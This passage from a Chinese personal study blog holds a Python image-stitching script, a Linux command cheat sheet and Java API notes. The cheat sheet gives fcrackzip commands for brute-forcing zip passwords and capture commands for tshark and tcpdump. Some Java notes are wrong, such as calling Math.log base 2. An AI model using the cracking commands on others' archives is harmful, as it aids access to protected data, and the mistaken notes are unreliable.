class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># os.path.getmtime() 函数是获取文件最后修改时间</span></span><br><span class="line">        <span class="comment"># os.path.getctime() 函数是获取文件最后创建时间 </span></span><br><span class="line">        dir_list = sorted(</span><br><span class="line">            dir_list,  </span><br><span class="line">            key=<span class="keyword">lambda</span> x: os.path.getmtime(</span><br><span class="line">                os.path.join(file_path,x)</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="comment"># 这行代码比较复杂, 逐行分析</span></span><br><span class="line">        <span class="comment"># 首先sorted()是一个基本的内置的排序函数, 这里加入了参数key=lambda.</span></span><br><span class="line">        <span class="comment"># lambda是一个隐函数. 后面的x代表的是列表dir_list中的某个元素</span></span><br><span class="line">        <span class="comment"># x 本身并无实际意义, 仅仅是供表达式使用的一个名字. 类似f(x)中的x</span></span><br><span class="line">        <span class="comment"># os.path.join(file_path,x)是将两个参数以路径的格式拼接在一起</span></span><br><span class="line">        <span class="comment"># 即会适当的补全'/'. </span></span><br><span class="line">        <span class="comment"># 不过因为此处的file_path就是"./all/"</span></span><br><span class="line">        <span class="comment"># 所以这段就等效于 (file_path+x)</span></span><br><span class="line">        <span class="comment"># os.path.getmtime(os.path.join(file_path,x))) 的意义就是</span></span><br><span class="line">        <span class="comment"># 列表中每个元素(代表文件路径)对应的文件的最后修改时间</span></span><br><span class="line">        <span class="comment"># 整行代码会使dir_list中的元素按照文件最后修改时间的升序排序.</span></span><br><span class="line">        <span class="keyword">return</span> dir_list</span><br><span class="line"></span><br><span class="line">list_im = get_file_list(path)[:] </span><br><span class="line">print(list_im)</span><br><span class="line"><span class="comment"># 小图片一共有231个</span></span><br><span class="line"><span class="comment"># 231 = 3 * 7 * 11</span></span><br><span class="line"><span class="comment"># 由于要拼接的是一个壁纸, 通常宽:高约为2:1</span></span><br><span class="line"><span class="comment"># 所以猜测 宽=21(张), 高=11(张)  (猜对了~~)</span></span><br><span class="line">column = <span class="number">21</span></span><br><span class="line">row_num = <span class="number">11</span></span><br><span class="line"><span class="comment"># 所有小图片的像素的宽和高</span></span><br><span class="line">width = <span class="number">35</span></span><br><span class="line">height = <span class="number">43</span></span><br><span class="line"><span class="comment"># 将Image对象置于列表中</span></span><br><span class="line">imgs = [Image.open(path+i) <span class="keyword">for</span> i <span class="keyword">in</span> list_im]</span><br><span class="line"><span class="comment"># 建立一个Image"容器", 供我们向其中添加小图片</span></span><br><span class="line">target = Image.new(<span class="string">'RGB'</span>, (width*column, height*row_num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(</span><br><span class="line">        len(list_im)</span><br><span class="line">    ):</span><br><span class="line">    <span class="comment"># 仅当i = 0, 21, 42, 63...时执行</span></span><br><span class="line">    <span class="keyword">if</span> i % column == <span class="number">0</span>:</span><br><span class="line">        end = i + column </span><br><span class="line">        <span class="comment"># enumetate() 将可迭代的遍历的数据的下标和数据组合并返回enumerate对象</span></span><br><span class="line">        <span class="comment"># 此对象可使用for迭代遍历</span></span><br><span class="line">        <span class="comment"># 例如:  </span></span><br><span class="line">        <span class="comment"># &gt;&gt;&gt; seasons = ['Spring', 'Summer', 'Fall', 'Winter']</span></span><br><span class="line">        <span class="comment"># &gt;&gt;&gt; list(enumerate(seasons))</span></span><br><span class="line">        <span class="comment"># [(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]</span></span><br><span class="line">        <span class="keyword">for</span> col, image <span class="keyword">in</span> enumerate(imgs[i:i+column]):</span><br><span class="line">            target.paste(</span><br><span class="line">                image, </span><br><span class="line">                <span class="comment"># 此处第二个参数, 为代表粘贴到的位置的左上角和右下角的坐标</span></span><br><span class="line">                (</span><br><span class="line">                    width*col, <span class="comment"># 左上 x </span></span><br><span class="line">                    height*(i//column), <span class="comment"># 左上 y </span></span><br><span class="line">                    width*(col + <span class="number">1</span>), <span class="comment"># 右下 x</span></span><br><span class="line">                    height*(i//column + <span class="number">1</span>) <span class="comment"># 右下 y</span></span><br><span class="line">                )</span><br><span class="line">            )   </span><br><span class="line"><span class="comment"># 在Windows下此函数可直接打开生成的图片并显示</span></span><br><span class="line">target.show()</span><br></pre></td></tr></table></figure>

<p><del>啊, 我写的注释竟然比代码行数多了.</del></p>
<p>over.</p>
]]></content>
      
        
        <tags>
            
            <tag> misc </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 常用命令]]></title>
      <url>/2019/09/18/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/</url>
      <content type="html"><![CDATA[<p>原《服务器运维》.</p>
<a id="more"></a>
<p>这两天操作系统课正在教怎么用linux命令, 我也顺便把这篇博客重新写写.</p>
<h1 id="linux-常用命令"><a href="#linux-常用命令" class="headerlink" title="linux 常用命令"></a>linux 常用命令</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
<li><p>新建文件 <code>touch &lt;name&gt;</code></p>
</li>
<li><p>删除文件 <code>rm   &lt;name&gt;</code></p>
</li>
<li><p>删除目录 <code>rm -r   &lt;name&gt;</code></p>
</li>
<li><p>解压缩 <code>unzip  &lt;name&gt;</code></p>
</li>
<li><p>文件复制 <code>cp 源文件 目标目录</code></p>
</li>
<li><p>文件移动 <code>mv 源文件 目标目录</code></p>
</li>
<li><p>查找文件</p>
<ol>
<li><code>find -name &#39;filename&#39;</code> 任意目录查询 </li>
<li><code>which filename</code> 从系统环境变量查询<br>因为命令在本质上讲就是文件, 所以这个命令更适合查询 某条命令调用的是哪个文件.</li>
<li><code>whatis</code> 用一句话描述某条命令的作用</li>
</ol>
</li>
<li><p>读取文件:</p>
<ol>
<li><code>cat filename</code><br>直接把文件内容全部输出</li>
<li><code>tail -n  10  filename</code><br>可以从文件的末尾向前读取.</li>
<li><code>less filename</code><br>和 more 这个命令很像, 都是分页读取, 适合那种大文件.<br>但是感觉less更顺手一些<br>空格: 向后翻一页, b: 向前翻一页, q: 退出, /‘txt’: 在文件中查找’txt’ </li>
<li><code>od filename</code><br>显示二进制数据, 可以加入参数<code>-h</code>以十六进制显示.</li>
</ol>
</li>
<li><p><code>tree [目录路径]</code> 以目录树的格式打印出某个目录的内容. </p>
</li>
</ul>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤出文件中包含 <code>key</code>的记录 :<br><code>grep &#39;key&#39; &lt;file&gt;</code><br>递归过滤 :<br><code>grep -r &#39;key&#39; &lt;file&gt;</code></p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>作用 |将上一个命令的输出作为下一个命令的输入, 操作符是 |</p>
<ol>
<li>将 cat 和 grep 组合在一起<br><code>cat &lt;file&gt; | grep &#39;key&#39;</code></li>
<li>过滤出目录中名字包含<code>key</code>的目录(不包含子目录)<br><code>ls | grep &#39;key&#39;</code></li>
</ol>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul>
<li>显示所有进程<br><code>ps -A</code></li>
<li>杀死某项进程<br><code>sudo kill [进程编号]</code></li>
<li>杀死某个用户的所有进程<br><code>sudo killall -u user</code></li>
</ul>
<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><ul>
<li><p><code>who</code></p>
<ul>
<li>第一列显示用户名称</li>
<li>第二列显示用户连接方式. Tty为直接连接, pts为远程登录</li>
<li>第三列和第四列分别为日期和时间</li>
<li>第五列登录IP地址</li>
</ul>
</li>
<li><p><code>whoami</code> 显示当前”操作用户”的用户名 </p>
</li>
<li><p><code>who am i</code> 显示”登录用户”的用户名 , 相当于<code>who -m</code></p>
</li>
<li><p><code>id</code> 显示用户以及所属群组的实际与有效ID</p>
</li>
</ul>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><h4 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h4><p>通过 <code>ls -al</code> 可以查看当前目录下的文件的权限.<br><code>drwxrw-rwx</code></p>
<table>
<thead>
<tr>
<th align="center">d</th>
<th align="center">rwx</th>
<th align="center">rw-</th>
<th align="center">rwx</th>
</tr>
</thead>
<tbody><tr>
<td align="center">是目录</td>
<td align="center">owner</td>
<td align="center">group</td>
<td align="center">other</td>
</tr>
</tbody></table>
<p>后面的r表示可读, w表示可写, x表示可执行.</p>
<h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><p><code>chmod 700 filename</code></p>
<p>其中 700 是二进制表示 <code>111 000 000</code></p>
<p>和上面的文件权限逐位对应.</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li>硬链接<br><code>ln targetFile linkedFile</code></li>
<li>符号链接<br><code>ln -s targetFile symLinkFile</code></li>
</ul>
<h2 id="编译-or-运行代码"><a href="#编译-or-运行代码" class="headerlink" title="编译 or 运行代码"></a>编译 or 运行代码</h2><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><p>编译C++程序(指定名称和后缀):</p>
<p><code>g++   *.cpp   -std=c++11 -o  a.exe</code></p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>可以使用 <code>php filename.php</code> 直接运行.</p>
<p>也可以放进web目录下, 通过浏览器访问启动, </p>
<p>各有各的用途.</p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p><strong>需要注意下python版本, 通常python指3.x 而 python2指2.x</strong></p>
<ol>
<li><code>python filename.py</code></li>
<li><code>python -c &quot;your code&quot;</code></li>
</ol>
<h2 id="服务器相关"><a href="#服务器相关" class="headerlink" title="服务器相关"></a>服务器相关</h2><h3 id="pscp"><a href="#pscp" class="headerlink" title="pscp"></a>pscp</h3><p>当使用ssh远程登录云主机后, 虽然我们有了可以输入命令的bash, 但是如果要上传文件需要使用工具pscp.</p>
<p>步骤:</p>
<ol>
<li>从本地打开<code>CMD</code>到(pscp)putty目录下</li>
<li>pscp</li>
<li>基本命令格式|<br><code>pscp   [本地文件路径]   [用户名]@[ServerIP]:[目录]</code><br>或<code>pscp  -r   [本地目录路径]  [用户名]@[ServerIP]|[目录]</code><br>同理，pscp也可以从Linux向Windows复制文件或目录</li>
</ol>
<p><strong>更推荐使用 finalShell 类的工具,非常方便,省去打命令的时间,且更直观</strong></p>
<h3 id="apache服务"><a href="#apache服务" class="headerlink" title="apache服务"></a>apache服务</h3><h4 id="启动-停止-重启"><a href="#启动-停止-重启" class="headerlink" title="启动|停止|重启:"></a>启动|停止|重启:</h4><p><code>service apache2 start|stop|restart</code></p>
<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p><code>/etc/apache2/apache2.conf</code></p>
<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="启动-停止-重启-1"><a href="#启动-停止-重启-1" class="headerlink" title="启动|停止|重启"></a>启动|停止|重启</h4><p><code>servive mysql start|stop|restart</code></p>
<h3 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>screen -S &lt;name&gt;</code></td>
<td align="left">创建名为 name 的session</td>
</tr>
<tr>
<td align="left"><code>screen  -ls</code></td>
<td align="left">显示所有session</td>
</tr>
<tr>
<td align="left"><code>screen  -r  &lt;name&gt;</code></td>
<td align="left">进入名为 name 的session</td>
</tr>
<tr>
<td align="left"><code>screen   -D  -r  &lt;name&gt;</code></td>
<td align="left">将名为name的session离线并重新连接</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     c</code></td>
<td align="left">在当前终端新建window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     w</code></td>
<td align="left">显示当前终端window列表</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     k</code></td>
<td align="left">关闭当前window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     0-9</code></td>
<td align="left">显示0-9 window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     space</code></td>
<td align="left">按照顺序显示下一个window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     A</code></td>
<td align="left">为当前window命名</td>
</tr>
</tbody></table>
<ul>
<li>注意<code>session</code>和<code>window</code>的区别, 一个<code>session</code>可以有多个<code>window</code></li>
<li><code>screen   -D  -r  &lt;name&gt;</code>可解决某些情况下无法重连接终端的问题</li>
<li>若要关闭某个session，则关闭该session下所有window即可</li>
</ul>
<h2 id="一些命令行工具的使用"><a href="#一些命令行工具的使用" class="headerlink" title="一些命令行工具的使用"></a>一些命令行工具的使用</h2><h3 id="vim-文本编辑器"><a href="#vim-文本编辑器" class="headerlink" title="vim 文本编辑器"></a>vim 文本编辑器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim filename</span><br></pre></td></tr></table></figure>

<p>vim文本编辑器拥有命令模式和编辑模式. 只有命令模式可以输入命令, 只有编辑模式可以编辑文本.<br>以下是命令模式下的某些命令.</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td align="left">在当前字符前插入文本，进入插入模式</td>
</tr>
<tr>
<td align="left">Esc</td>
<td align="left">从编辑模式切换到命令模式</td>
</tr>
<tr>
<td align="left">wq</td>
<td align="left">在命令模式下，执行存盘退出操作</td>
</tr>
<tr>
<td align="left">w</td>
<td align="left">在命令模式下，执行存盘操作</td>
</tr>
<tr>
<td align="left">w!</td>
<td align="left">在命令模式下，执行强制存盘操作</td>
</tr>
<tr>
<td align="left">q</td>
<td align="left">在命令模式下，执行退出vi操作</td>
</tr>
<tr>
<td align="left">q!</td>
<td align="left">在命令模式下，执行强制退出vi操作</td>
</tr>
</tbody></table>
<h3 id="tshark-使用"><a href="#tshark-使用" class="headerlink" title="tshark 使用"></a>tshark 使用</h3><p>抓包的工具.<br><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
<ul>
<li><p>显示可用网卡 <code>tshark -D</code></p>
</li>
<li><p>抓包  使用命令 </p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>-c 表示抓多少包后停止</li>
<li>-w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</li>
<li>-f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 “port 80”</li>
</ul>
<p>但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 <code>tcpdump</code> 的方法.</p>
<ul>
<li>抓包 :  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>-s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</li>
<li>-w 输入到文件</li>
<li>port 监听的端口</li>
</ul>
<p><strong>使用 tcpdump 同样需要sudo</strong></p>
<h3 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h3><p>一款kali下预装的好用的zip密码破解工具, 支持遍历爆破密码或者跑字典.</p>
<ul>
<li><p>遍历:</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -v -b -u -c a -p magicaaaa filename.zip</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数含义:</p>
<ul>
<li>-v : 详细信息</li>
<li>-b : 爆破</li>
<li>-u : 指定zip压缩格式(大概)</li>
<li>-c : 指定密码类型, 选项值 a 就是纯字符串, 1 就是纯数字, a1 就是数字和字符串混杂.</li>
<li>-p : 指定密码, magicaaaa就是前五位确定是magic了, 后面的a在这里是掩码, 表明这4位是字母.</li>
<li>filename : 要破解的压缩包的名称.  </li>
</ul>
</li>
</ul>
<ul>
<li>跑字典:  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.zip</span><br></pre></td></tr></table></figure>


</li>
</ul>
<p>其中的rockyou.txt是个不错的密码字典, 可惜就是只符合外国人的密码习惯, 终于国内的比赛环境或是实战意义不大.</p>
<h2 id="MineCraft相关命令"><a href="#MineCraft相关命令" class="headerlink" title="MineCraft相关命令"></a>MineCraft相关命令</h2><p>说出来你可能不信, 当初我学习使用ubuntu云服务器是为了玩MineCraft哒~</p>
<ul>
<li><p>mine craft启动命令（其他jar类型的程序应该也可以如此启动）<br><code>java -Xms# -Xmx# -jar [path]/minecraft_server.[version].jar nogui</code><br><code>nogui</code>:表示不以图形界面运行,因为我的服务器是server版的,本身就没有图形界面,所以不加也可以<br><code>-Xms</code>:初始启动分配内存<br><code>-Xmx</code>:最大分配内存<br><code>path</code>:jar包所在路径<br><code>version</code>:当前MineCraft_Server版本</p>
</li>
<li><p><code>tell &lt;sb&gt; &lt;something&gt;</code>: 给sb 私信 </p>
</li>
<li><p><code>gamemode survival &lt;sb&gt;</code>:将 sb 调至 生存模式</p>
</li>
<li><p><code>gamemode create &lt;sb&gt;</code>:将sb 调至 创造模式</p>
</li>
</ul>
<p><strong>更多的关于MC的命令去百度上自己搜吧亲, 我现在不玩 MineCraft 了</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java 常用方法总结]]></title>
      <url>/2019/09/17/Java/</url>
      <content type="html"><![CDATA[<p>划重点, 考试要考的</p>
<a id="more"></a>

<h1 id="Java-常用方法总结"><a href="#Java-常用方法总结" class="headerlink" title="Java 常用方法总结"></a>Java 常用方法总结</h1><p>看到java书上有那么多自带的方法, 感觉如果不总结就容易忘掉.</p>
<p>试试记笔记效果咋样吧.</p>
<p><del>试试就试试</del></p>
<h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="comment">// 读入整型</span></span><br><span class="line">input.nextInt();</span><br><span class="line"><span class="comment">// 读入浮点型</span></span><br><span class="line">input.nextFloat();</span><br><span class="line"><span class="comment">// 读入双精度浮点型</span></span><br><span class="line">input.nextDouble();</span><br><span class="line"><span class="comment">// 依此类推, 不再列举</span></span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul>
<li>输出后换行<br>  <code>System.out.println(&quot;hello world&quot;);</code></li>
<li>输出后不换行<br>  <code>System.out.print(&quot;hello world&quot;);</code></li>
<li>功能更强大, 类似C语言中的 printf()<br>  <code>System.out.printf(&quot;|%5d|&quot;,2*6); // =&gt; |   12|</code><table>
<thead>
<tr>
<th align="left">+ 格式控制符</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%d</td>
<td align="left">整数</td>
</tr>
<tr>
<td align="left">%8d</td>
<td align="left">整数, 右对齐, 输出宽度为 8</td>
</tr>
<tr>
<td align="left">%-6d</td>
<td align="left">整数, 左对齐, 输出宽度为 6</td>
</tr>
<tr>
<td align="left">%s</td>
<td align="left">字符串同理, 只是把 d 换成 s</td>
</tr>
<tr>
<td align="left">%f</td>
<td align="left">浮点数</td>
</tr>
<tr>
<td align="left">%8f</td>
<td align="left">浮点数, 右对齐, 输出宽度为 8</td>
</tr>
<tr>
<td align="left">%.2f</td>
<td align="left">浮点数, 精确到百分位</td>
</tr>
<tr>
<td align="left">%16.3%</td>
<td align="left">浮点数, 精确到千分位, 输出宽度为 16</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><ul>
<li>控制小数位<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> scale = <span class="number">3.1015926</span>; </span><br><span class="line"><span class="comment">//设定保留多少位小数的模板，如保留三位小数就是#0.000</span></span><br><span class="line">DecimalFormat fnum = <span class="keyword">new</span> DecimalFormat(<span class="string">"#0.000"</span>); </span><br><span class="line">String d=fnum.format(scale);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="字符-以下省略Character"><a href="#字符-以下省略Character" class="headerlink" title="字符 (以下省略Character.)"></a>字符 (以下省略<code>Character.</code>)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isDigit</span><span class="params">(ch)</span></span>; <span class="comment">//是数字?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isLetter</span><span class="params">(ch)</span></span>; <span class="comment">//是字母?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isLetterOrDigit</span><span class="params">(ch)</span></span>; <span class="comment">//是字母或数字?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isLowerCase</span><span class="params">(ch)</span></span>; <span class="comment">//是小写?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isUpperCase</span><span class="params">(ch)</span></span>; <span class="comment">//是大写?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">toLowerCase</span><span class="params">(ch)</span></span>; <span class="comment">//转为小写</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">toUpperCase</span><span class="params">(ch)</span></span>; <span class="comment">//转为大写</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串-以下省略String"><a href="#字符串-以下省略String" class="headerlink" title="字符串(以下省略String.)"></a>字符串(以下省略<code>String.</code>)</h3><h4 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">length()</span><br><span class="line">charAt(index) <span class="comment">//返回字符串中第index位的字符, 类似 string[index]</span></span><br><span class="line">toUpperCase()  <span class="comment">//全部大写</span></span><br><span class="line">toLowerCase()</span><br><span class="line">trim() <span class="comment">//去除两端空格</span></span><br><span class="line">indexOf(<span class="keyword">char</span> parm) <span class="comment">//返回字符串中 parm 第一次出现的位置</span></span><br><span class="line">indexOf(string parm)</span><br><span class="line">substring(<span class="keyword">int</span> startIndex) <span class="comment">//返回index到结束的字串</span></span><br><span class="line">substring(<span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)  <span class="comment">//返回中间的字符串, 不包括终点.</span></span><br></pre></td></tr></table></figure>

<h4 id="修改某几位的字符串"><a href="#修改某几位的字符串" class="headerlink" title="修改某几位的字符串"></a>修改某几位的字符串</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量同上面</span></span><br><span class="line">sb.replace(<span class="number">2</span>,<span class="number">4</span>,<span class="string">"bc"</span>);</span><br></pre></td></tr></table></figure>

<h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String s = <span class="string">"abc"</span>;</span><br><span class="line">System.out.println(s.compareTo(<span class="string">"aaa"</span>));</span><br><span class="line">System.out.println(s.compareTo(<span class="string">"abc"</span>));</span><br><span class="line">System.out.println(s.compareTo(<span class="string">"bbb"</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">-<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="StringBuilder-Stringbuffer"><a href="#StringBuilder-Stringbuffer" class="headerlink" title="StringBuilder/Stringbuffer"></a>StringBuilder/Stringbuffer</h3><p>这两个类型都是用来处理字符串操作的, 区别主要在于前者线程安全. 所以使用方法大同小异.<br><code>StringBuffer sb = new StringBuffer(&quot;abc dds&quot;);</code></p>
<h4 id="删除某位字符"><a href="#删除某位字符" class="headerlink" title="删除某位字符"></a>删除某位字符</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sb.deleteCharAt(<span class="number">1</span>); <span class="comment">//=&gt; "ac dds"</span></span><br></pre></td></tr></table></figure>

<h4 id="加入字符串"><a href="#加入字符串" class="headerlink" title="加入字符串"></a>加入字符串</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sb.insert(<span class="number">1</span>,<span class="string">"bs"</span>); <span class="comment">//=&gt; "absbc dds"</span></span><br></pre></td></tr></table></figure>

<h2 id="数学函数-以下省略-Math"><a href="#数学函数-以下省略-Math" class="headerlink" title="数学函数 (以下省略 Math. )"></a>数学函数 (以下省略 <code>Math.</code> )</h2><h3 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sin(<span class="keyword">double</span> a);</span><br><span class="line">cos(<span class="keyword">double</span> a);</span><br><span class="line">tan(<span class="keyword">double</span> a);</span><br><span class="line">acos(<span class="keyword">double</span> a);  <span class="comment">//arccos </span></span><br><span class="line">asin(<span class="keyword">double</span> a);  <span class="comment">//arcsin</span></span><br><span class="line">atan(<span class="keyword">double</span> a);  <span class="comment">//arctan</span></span><br></pre></td></tr></table></figure>

<h3 id="幂运算-对数运算"><a href="#幂运算-对数运算" class="headerlink" title="幂运算, 对数运算"></a>幂运算, 对数运算</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp(<span class="keyword">double</span> a); <span class="comment">//e 的 a 次方</span></span><br><span class="line">log(<span class="keyword">double</span> a); <span class="comment">//以 2 为底</span></span><br><span class="line">log10(<span class="keyword">double</span> a);</span><br><span class="line">pow(<span class="keyword">double</span> a, <span class="keyword">double</span> b); <span class="comment">// a 的 b 次方</span></span><br><span class="line">sqrt(<span class="keyword">double</span> a);</span><br></pre></td></tr></table></figure>

<h3 id="取整"><a href="#取整" class="headerlink" title="取整"></a>取整</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ceil</span><span class="params">(<span class="keyword">double</span> x)</span></span>;  <span class="comment">//向上取整</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">floor</span><span class="params">(<span class="keyword">double</span> x)</span></span>;  <span class="comment">//向下取整</span></span><br><span class="line"><span class="comment">//返回最接近参数的整数值, 若存在两个这样的数, 则返回其中的偶数</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">rint</span><span class="params">(<span class="keyword">double</span> x)</span></span>;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">round</span><span class="params">(<span class="keyword">float</span> x)</span></span>;  <span class="comment">//四舍五入</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">round</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random() <span class="comment">// 随机数  0 &lt;= x &lt; 1.0</span></span><br><span class="line">abs(a)  </span><br><span class="line">max(a,b)</span><br><span class="line">min(a,b)</span><br></pre></td></tr></table></figure>

